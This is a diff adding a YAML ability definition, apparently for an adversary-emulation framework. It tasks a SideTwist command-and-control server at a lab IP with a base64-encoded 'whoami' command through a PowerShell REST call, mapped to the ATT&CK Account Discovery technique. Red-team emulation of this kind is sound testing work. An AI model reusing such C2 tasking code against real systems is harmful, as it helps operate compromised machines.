@@ -1,0 +1,26 @@
+---
+- id: 1bf5dcff-a65b-5606-becc-a6327f063578
+  name: sidetwist_whoami
+  description: Issue whoami command via SideTwist C2 channel
+  tactic: discovery
+  technique_id: T1087
+  technique_name: Account Discovery
+  executors:
+  - name: psh
+    platform: windows
+    command: |
+      $whoamiB64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("whoami"))
+      $task = "0|101|$whoamiB64"
+      $body = @{ task = $task } | ConvertTo-Json
+      Invoke-RestMethod -Uri "http://192.168.21.132:18450/api/task" -Method PUT -ContentType "application/json" -Body $body
+      Start-Sleep -Seconds 15
+      Write-Output "whoami task issued via SideTwist C2"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
